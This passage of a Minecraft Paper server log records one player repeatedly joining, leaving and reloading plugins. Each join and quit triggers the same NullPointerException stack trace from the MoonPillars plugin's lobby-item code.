	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.MoonLab.OnLeave(MoonLab.java:72) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at com.destroystokyo.paper.event.executor.asm.generated.GeneratedEventExecutor201.execute(Unknown Source) ~[?:?]
	at org.bukkit.plugin.EventExecutor$2.execute(EventExecutor.java:77) ~[paper-api-1.21-R0.1-SNAPSHOT.jar:?]
	at co.aikar.timings.TimedEventExecutor.execute(TimedEventExecutor.java:80) ~[paper-api-1.21-R0.1-SNAPSHOT.jar:1.21-127-4e6a2a1]
	at org.bukkit.plugin.RegisteredListener.callEvent(RegisteredListener.java:70) ~[paper-api-1.21-R0.1-SNAPSHOT.jar:?]
	at io.papermc.paper.plugin.manager.PaperEventManager.callEvent(PaperEventManager.java:54) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at io.papermc.paper.plugin.manager.PaperPluginManagerImpl.callEvent(PaperPluginManagerImpl.java:131) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at org.bukkit.plugin.SimplePluginManager.callEvent(SimplePluginManager.java:628) ~[paper-api-1.21-R0.1-SNAPSHOT.jar:?]
	at net.minecraft.server.players.PlayerList.remove(PlayerList.java:605) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.players.PlayerList.remove(PlayerList.java:590) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.network.ServerGamePacketListenerImpl.removePlayerFromWorld(ServerGamePacketListenerImpl.java:2036) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.network.ServerGamePacketListenerImpl.onDisconnect(ServerGamePacketListenerImpl.java:2016) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.network.ServerGamePacketListenerImpl.onDisconnect(ServerGamePacketListenerImpl.java:2003) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.network.Connection.handleDisconnection(Connection.java:902) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.network.ServerConnectionListener.tick(ServerConnectionListener.java:262) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.tickChildren(MinecraftServer.java:1823) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.dedicated.DedicatedServer.tickChildren(DedicatedServer.java:473) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.tickServer(MinecraftServer.java:1598) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.runServer(MinecraftServer.java:1304) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.lambda$spin$0(MinecraftServer.java:330) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at java.base/java.lang.Thread.run(Thread.java:1583) ~[?:?]
[14:07:14] [Server thread/INFO]: [MineBridge] survival оффлайн
[14:07:14] [Server thread/ERROR]: Could not pass event PlayerQuitEvent to MoonPillars v5.2.2
java.lang.NullPointerException: Cannot invoke ""org.bukkit.configuration.ConfigurationSection.getKeys(boolean)"" because the return value of ""org.bukkit.configuration.file.FileConfiguration.getConfigurationSection(String)"" is null
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.UltimateGuis.InventoryItemAPI.GiveLobbyItems(InventoryItemAPI.java:38) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.GameAPI.GameManager.FinalLeaveGame(GameManager.java:1108) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.GameAPI.GameManager.leaveGame(GameManager.java:1069) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.GameAPI.GameManager.onLeave(GameManager.java:986) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at com.destroystokyo.paper.event.executor.asm.generated.GeneratedEventExecutor222.execute(Unknown Source) ~[?:?]
	at org.bukkit.plugin.EventExecutor$2.execute(EventExecutor.java:77) ~[paper-api-1.21-R0.1-SNAPSHOT.jar:?]
	at co.aikar.timings.TimedEventExecutor.execute(TimedEventExecutor.java:80) ~[paper-api-1.21-R0.1-SNAPSHOT.jar:1.21-127-4e6a2a1]
	at org.bukkit.plugin.RegisteredListener.callEvent(RegisteredListener.java:70) ~[paper-api-1.21-R0.1-SNAPSHOT.jar:?]
	at io.papermc.paper.plugin.manager.PaperEventManager.callEvent(PaperEventManager.java:54) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at io.papermc.paper.plugin.manager.PaperPluginManagerImpl.callEvent(PaperPluginManagerImpl.java:131) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at org.bukkit.plugin.SimplePluginManager.callEvent(SimplePluginManager.java:628) ~[paper-api-1.21-R0.1-SNAPSHOT.jar:?]
	at net.minecraft.server.players.PlayerList.remove(PlayerList.java:605) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.players.PlayerList.remove(PlayerList.java:590) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.network.ServerGamePacketListenerImpl.removePlayerFromWorld(ServerGamePacketListenerImpl.java:2036) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.network.ServerGamePacketListenerImpl.onDisconnect(ServerGamePacketListenerImpl.java:2016) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.network.ServerGamePacketListenerImpl.onDisconnect(ServerGamePacketListenerImpl.java:2003) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.network.Connection.handleDisconnection(Connection.java:902) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.network.ServerConnectionListener.tick(ServerConnectionListener.java:262) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.tickChildren(MinecraftServer.java:1823) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.dedicated.DedicatedServer.tickChildren(DedicatedServer.java:473) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.tickServer(MinecraftServer.java:1598) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.runServer(MinecraftServer.java:1304) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.lambda$spin$0(MinecraftServer.java:330) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at java.base/java.lang.Thread.run(Thread.java:1583) ~[?:?]
[14:07:14] [Server thread/INFO]: [MoonPillars] [STDOUT] DELETE Response: Offline player deleted successfully.
[14:07:14] [Server thread/WARN]: Nag author(s): '[Kloppie74]' of 'MoonPillars v5.2.2' about their usage of System.out/err.print. Please use your plugin's logger instead (JavaPlugin#getLogger).
[14:07:14] [Server thread/INFO]: [NoChatReports] Forgetting player: JustCheburek
[14:07:19] [User Authenticator #1/INFO]: UUID of player JustCheburek is 168fa541-313e-44b2-beaa-5bebf9595e28
[14:07:25] [Server thread/ERROR]: Could not pass event PlayerJoinEvent to MoonPillars v5.2.2
java.lang.NullPointerException: Cannot invoke ""org.bukkit.configuration.ConfigurationSection.getKeys(boolean)"" because the return value of ""org.bukkit.configuration.file.FileConfiguration.getConfigurationSection(String)"" is null
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.UltimateGuis.InventoryItemAPI.GiveLobbyItems(InventoryItemAPI.java:38) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.MoonLab.OnJoin(MoonLab.java:98) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at com.destroystokyo.paper.event.executor.asm.generated.GeneratedEventExecutor202.execute(Unknown Source) ~[?:?]
	at org.bukkit.plugin.EventExecutor$2.execute(EventExecutor.java:77) ~[paper-api-1.21-R0.1-SNAPSHOT.jar:?]
	at co.aikar.timings.TimedEventExecutor.execute(TimedEventExecutor.java:80) ~[paper-api-1.21-R0.1-SNAPSHOT.jar:1.21-127-4e6a2a1]
	at org.bukkit.plugin.RegisteredListener.callEvent(RegisteredListener.java:70) ~[paper-api-1.21-R0.1-SNAPSHOT.jar:?]
	at io.papermc.paper.plugin.manager.PaperEventManager.callEvent(PaperEventManager.java:54) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at io.papermc.paper.plugin.manager.PaperPluginManagerImpl.callEvent(PaperPluginManagerImpl.java:131) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at org.bukkit.plugin.SimplePluginManager.callEvent(SimplePluginManager.java:628) ~[paper-api-1.21-R0.1-SNAPSHOT.jar:?]
	at net.minecraft.server.players.PlayerList.placeNewPlayer(PlayerList.java:347) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.network.ServerConfigurationPacketListenerImpl.handleConfigurationFinished(ServerConfigurationPacketListenerImpl.java:173) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.network.protocol.configuration.ServerboundFinishConfigurationPacket.handle(ServerboundFinishConfigurationPacket.java:22) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.network.protocol.configuration.ServerboundFinishConfigurationPacket.handle(ServerboundFinishConfigurationPacket.java:13) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.network.protocol.PacketUtils.lambda$ensureRunningOnSameThread$0(PacketUtils.java:56) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.TickTask.run(TickTask.java:18) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.util.thread.BlockableEventLoop.doRunTask(BlockableEventLoop.java:151) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.util.thread.ReentrantBlockableEventLoop.doRunTask(ReentrantBlockableEventLoop.java:24) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.doRunTask(MinecraftServer.java:1537) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.doRunTask(MinecraftServer.java:201) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.util.thread.BlockableEventLoop.pollTask(BlockableEventLoop.java:125) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.pollTaskInternal(MinecraftServer.java:1514) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.pollTask(MinecraftServer.java:1507) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.util.thread.BlockableEventLoop.managedBlock(BlockableEventLoop.java:135) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.managedBlock(MinecraftServer.java:1466) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.waitUntilNextTick(MinecraftServer.java:1473) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.runServer(MinecraftServer.java:1318) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.lambda$spin$0(MinecraftServer.java:330) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at java.base/java.lang.Thread.run(Thread.java:1583) ~[?:?]
[14:07:25] [Server thread/INFO]: [NoChatReports] Setting up player: JustCheburek
[14:07:25] [Server thread/INFO]: JustCheburek[/109.126.59.118:48748] logged in with entity id 12 at ([world]-75.5, 111.0, -16.5)
[14:08:45] [Server thread/INFO]: JustCheburek issued server command: /akro reload
[14:08:45] [Server thread/INFO]: [Akropolis] Loaded custom menu selector.
[14:08:45] [Server thread/INFO]: [Akropolis] Loaded custom menu teleport.
[14:08:45] [Server thread/INFO]: [Akropolis] No holograms to load!
[14:08:45] [Server thread/INFO]: [Akropolis] Loaded 11 plugin modules.
[14:08:48] [Server thread/INFO]: JustCheburek issued server command: /mb
[14:08:48] [Server thread/INFO]: JustCheburek lost connection: Disconnected
[14:08:48] [Server thread/INFO]: [MineBridge] Вы поменяли гм на SURVIVAL для JustCheburek
[14:08:48] [Server thread/ERROR]: Could not pass event PlayerQuitEvent to MoonPillars v5.2.2
java.lang.NullPointerException: Cannot invoke ""org.bukkit.configuration.ConfigurationSection.getKeys(boolean)"" because the return value of ""org.bukkit.configuration.file.FileConfiguration.getConfigurationSection(String)"" is null
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.UltimateGuis.InventoryItemAPI.GiveLobbyItems(InventoryItemAPI.java:38) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.GameAPI.GameManager.FinalLeaveGame(GameManager.java:1108) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.GameAPI.GameManager.leaveGame(GameManager.java:1069) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.MoonLab.OnLeave(MoonLab.java:72) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at com.destroystokyo.paper.event.executor.asm.generated.GeneratedEventExecutor201.execute(Unknown Source) ~[?:?]
	at org.bukkit.plugin.EventExecutor$2.execute(EventExecutor.java:77) ~[paper-api-1.21-R0.1-SNAPSHOT.jar:?]
	at co.aikar.timings.TimedEventExecutor.execute(TimedEventExecutor.java:80) ~[paper-api-1.21-R0.1-SNAPSHOT.jar:1.21-127-4e6a2a1]
	at org.bukkit.plugin.RegisteredListener.callEvent(RegisteredListener.java:70) ~[paper-api-1.21-R0.1-SNAPSHOT.jar:?]
	at io.papermc.paper.plugin.manager.PaperEventManager.callEvent(PaperEventManager.java:54) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at io.papermc.paper.plugin.manager.PaperPluginManagerImpl.callEvent(PaperPluginManagerImpl.java:131) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at org.bukkit.plugin.SimplePluginManager.callEvent(SimplePluginManager.java:628) ~[paper-api-1.21-R0.1-SNAPSHOT.jar:?]
	at net.minecraft.server.players.PlayerList.remove(PlayerList.java:605) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.players.PlayerList.remove(PlayerList.java:590) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.network.ServerGamePacketListenerImpl.removePlayerFromWorld(ServerGamePacketListenerImpl.java:2036) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.network.ServerGamePacketListenerImpl.onDisconnect(ServerGamePacketListenerImpl.java:2016) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.network.ServerGamePacketListenerImpl.onDisconnect(ServerGamePacketListenerImpl.java:2003) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.network.Connection.handleDisconnection(Connection.java:902) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.network.ServerConnectionListener.tick(ServerConnectionListener.java:262) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.tickChildren(MinecraftServer.java:1823) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.dedicated.DedicatedServer.tickChildren(DedicatedServer.java:473) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.tickServer(MinecraftServer.java:1598) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.runServer(MinecraftServer.java:1304) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.lambda$spin$0(MinecraftServer.java:330) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at java.base/java.lang.Thread.run(Thread.java:1583) ~[?:?]
[14:08:48] [Server thread/INFO]: [MineBridge] Вы поменяли гм на SURVIVAL для JustCheburek
[14:08:48] [Server thread/ERROR]: Could not pass event PlayerQuitEvent to MoonPillars v5.2.2
java.lang.NullPointerException: Cannot invoke ""org.bukkit.configuration.ConfigurationSection.getKeys(boolean)"" because the return value of ""org.bukkit.configuration.file.FileConfiguration.getConfigurationSection(String)"" is null
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.UltimateGuis.InventoryItemAPI.GiveLobbyItems(InventoryItemAPI.java:38) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.GameAPI.GameManager.FinalLeaveGame(GameManager.java:1108) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.GameAPI.GameManager.leaveGame(GameManager.java:1069) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.GameAPI.GameManager.onLeave(GameManager.java:986) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at com.destroystokyo.paper.event.executor.asm.generated.GeneratedEventExecutor222.execute(Unknown Source) ~[?:?]
	at org.bukkit.plugin.EventExecutor$2.execute(EventExecutor.java:77) ~[paper-api-1.21-R0.1-SNAPSHOT.jar:?]
	at co.aikar.timings.TimedEventExecutor.execute(TimedEventExecutor.java:80) ~[paper-api-1.21-R0.1-SNAPSHOT.jar:1.21-127-4e6a2a1]
	at org.bukkit.plugin.RegisteredListener.callEvent(RegisteredListener.java:70) ~[paper-api-1.21-R0.1-SNAPSHOT.jar:?]
	at io.papermc.paper.plugin.manager.PaperEventManager.callEvent(PaperEventManager.java:54) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at io.papermc.paper.plugin.manager.PaperPluginManagerImpl.callEvent(PaperPluginManagerImpl.java:131) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at org.bukkit.plugin.SimplePluginManager.callEvent(SimplePluginManager.java:628) ~[paper-api-1.21-R0.1-SNAPSHOT.jar:?]
	at net.minecraft.server.players.PlayerList.remove(PlayerList.java:605) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.players.PlayerList.remove(PlayerList.java:590) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.network.ServerGamePacketListenerImpl.removePlayerFromWorld(ServerGamePacketListenerImpl.java:2036) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.network.ServerGamePacketListenerImpl.onDisconnect(ServerGamePacketListenerImpl.java:2016) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.network.ServerGamePacketListenerImpl.onDisconnect(ServerGamePacketListenerImpl.java:2003) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.network.Connection.handleDisconnection(Connection.java:902) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.network.ServerConnectionListener.tick(ServerConnectionListener.java:262) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.tickChildren(MinecraftServer.java:1823) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.dedicated.DedicatedServer.tickChildren(DedicatedServer.java:473) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.tickServer(MinecraftServer.java:1598) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.runServer(MinecraftServer.java:1304) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.lambda$spin$0(MinecraftServer.java:330) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at java.base/java.lang.Thread.run(Thread.java:1583) ~[?:?]
[14:08:48] [Server thread/INFO]: [MoonPillars] [STDOUT] DELETE Response: Offline player deleted successfully.
[14:08:48] [Server thread/INFO]: [NoChatReports] Forgetting player: JustCheburek
[14:09:26] [User Authenticator #2/INFO]: UUID of player JustCheburek is 168fa541-313e-44b2-beaa-5bebf9595e28
[14:09:26] [Server thread/ERROR]: Could not pass event PlayerJoinEvent to MoonPillars v5.2.2
java.lang.NullPointerException: Cannot invoke ""org.bukkit.configuration.ConfigurationSection.getKeys(boolean)"" because the return value of ""org.bukkit.configuration.file.FileConfiguration.getConfigurationSection(String)"" is null
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.UltimateGuis.InventoryItemAPI.GiveLobbyItems(InventoryItemAPI.java:38) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.MoonLab.OnJoin(MoonLab.java:98) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at com.destroystokyo.paper.event.executor.asm.generated.GeneratedEventExecutor202.execute(Unknown Source) ~[?:?]
	at org.bukkit.plugin.EventExecutor$2.execute(EventExecutor.java:77) ~[paper-api-1.21-R0.1-SNAPSHOT.jar:?]
	at co.aikar.timings.TimedEventExecutor.execute(TimedEventExecutor.java:80) ~[paper-api-1.21-R0.1-SNAPSHOT.jar:1.21-127-4e6a2a1]
	at org.bukkit.plugin.RegisteredListener.callEvent(RegisteredListener.java:70) ~[paper-api-1.21-R0.1-SNAPSHOT.jar:?]
	at io.papermc.paper.plugin.manager.PaperEventManager.callEvent(PaperEventManager.java:54) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at io.papermc.paper.plugin.manager.PaperPluginManagerImpl.callEvent(PaperPluginManagerImpl.java:131) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at org.bukkit.plugin.SimplePluginManager.callEvent(SimplePluginManager.java:628) ~[paper-api-1.21-R0.1-SNAPSHOT.jar:?]
	at net.minecraft.server.players.PlayerList.placeNewPlayer(PlayerList.java:347) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.network.ServerConfigurationPacketListenerImpl.handleConfigurationFinished(ServerConfigurationPacketListenerImpl.java:173) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.network.protocol.configuration.ServerboundFinishConfigurationPacket.handle(ServerboundFinishConfigurationPacket.java:22) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.network.protocol.configuration.ServerboundFinishConfigurationPacket.handle(ServerboundFinishConfigurationPacket.java:13) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.network.protocol.PacketUtils.lambda$ensureRunningOnSameThread$0(PacketUtils.java:56) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.TickTask.run(TickTask.java:18) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.util.thread.BlockableEventLoop.doRunTask(BlockableEventLoop.java:151) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.util.thread.ReentrantBlockableEventLoop.doRunTask(ReentrantBlockableEventLoop.java:24) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.doRunTask(MinecraftServer.java:1537) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.doRunTask(MinecraftServer.java:201) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.util.thread.BlockableEventLoop.pollTask(BlockableEventLoop.java:125) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.pollTaskInternal(MinecraftServer.java:1514) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.pollTask(MinecraftServer.java:1507) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.util.thread.BlockableEventLoop.managedBlock(BlockableEventLoop.java:135) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.managedBlock(MinecraftServer.java:1466) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.waitUntilNextTick(MinecraftServer.java:1473) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.runServer(MinecraftServer.java:1318) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.lambda$spin$0(MinecraftServer.java:330) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at java.base/java.lang.Thread.run(Thread.java:1583) ~[?:?]
[14:09:27] [Server thread/INFO]: [NoChatReports] Setting up player: JustCheburek
[14:09:27] [Server thread/INFO]: JustCheburek[/109.126.59.118:50410] logged in with entity id 23 at ([world]-75.5, 111.0, -16.5)
[14:09:44] [Server thread/INFO]: JustCheburek issued server command: /akro reload
[14:09:44] [Server thread/INFO]: [Akropolis] Loaded custom menu selector.
[14:09:44] [Server thread/INFO]: [Akropolis] Loaded custom menu teleport.
[14:09:44] [Server thread/INFO]: [Akropolis] No holograms to load!
[14:09:44] [Server thread/INFO]: [Akropolis] Loaded 11 plugin modules.
[14:10:21] [Server thread/INFO]: JustCheburek issued server command: /joingame clouds
[14:10:25] [Server thread/INFO]: JustCheburek issued server command: /joingame random
[14:10:32] [Server thread/INFO]: JustCheburek issued server command: /mb
[14:10:32] [Server thread/INFO]: JustCheburek lost connection: Disconnected
[14:10:32] [Server thread/INFO]: [MineBridge] Вы поменяли гм на SURVIVAL для JustCheburek
[14:10:32] [Server thread/ERROR]: Could not pass event PlayerQuitEvent to MoonPillars v5.2.2
java.lang.NullPointerException: Cannot invoke ""org.bukkit.configuration.ConfigurationSection.getKeys(boolean)"" because the return value of ""org.bukkit.configuration.file.FileConfiguration.getConfigurationSection(String)"" is null
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.UltimateGuis.InventoryItemAPI.GiveLobbyItems(InventoryItemAPI.java:38) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.GameAPI.GameManager.FinalLeaveGame(GameManager.java:1108) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.GameAPI.GameManager.leaveGame(GameManager.java:1069) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.MoonLab.OnLeave(MoonLab.java:72) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at com.destroystokyo.paper.event.executor.asm.generated.GeneratedEventExecutor201.execute(Unknown Source) ~[?:?]
	at org.bukkit.plugin.EventExecutor$2.execute(EventExecutor.java:77) ~[paper-api-1.21-R0.1-SNAPSHOT.jar:?]
	at co.aikar.timings.TimedEventExecutor.execute(TimedEventExecutor.java:80) ~[paper-api-1.21-R0.1-SNAPSHOT.jar:1.21-127-4e6a2a1]
	at org.bukkit.plugin.RegisteredListener.callEvent(RegisteredListener.java:70) ~[paper-api-1.21-R0.1-SNAPSHOT.jar:?]
	at io.papermc.paper.plugin.manager.PaperEventManager.callEvent(PaperEventManager.java:54) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at io.papermc.paper.plugin.manager.PaperPluginManagerImpl.callEvent(PaperPluginManagerImpl.java:131) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at org.bukkit.plugin.SimplePluginManager.callEvent(SimplePluginManager.java:628) ~[paper-api-1.21-R0.1-SNAPSHOT.jar:?]
	at net.minecraft.server.players.PlayerList.remove(PlayerList.java:605) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.players.PlayerList.remove(PlayerList.java:590) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.network.ServerGamePacketListenerImpl.removePlayerFromWorld(ServerGamePacketListenerImpl.java:2036) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.network.ServerGamePacketListenerImpl.onDisconnect(ServerGamePacketListenerImpl.java:2016) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.network.ServerGamePacketListenerImpl.onDisconnect(ServerGamePacketListenerImpl.java:2003) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.network.Connection.handleDisconnection(Connection.java:902) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.network.ServerConnectionListener.tick(ServerConnectionListener.java:262) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.tickChildren(MinecraftServer.java:1823) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.dedicated.DedicatedServer.tickChildren(DedicatedServer.java:473) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.tickServer(MinecraftServer.java:1598) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.runServer(MinecraftServer.java:1304) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.lambda$spin$0(MinecraftServer.java:330) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at java.base/java.lang.Thread.run(Thread.java:1583) ~[?:?]
[14:10:32] [Server thread/INFO]: [MineBridge] Вы поменяли гм на SURVIVAL для JustCheburek
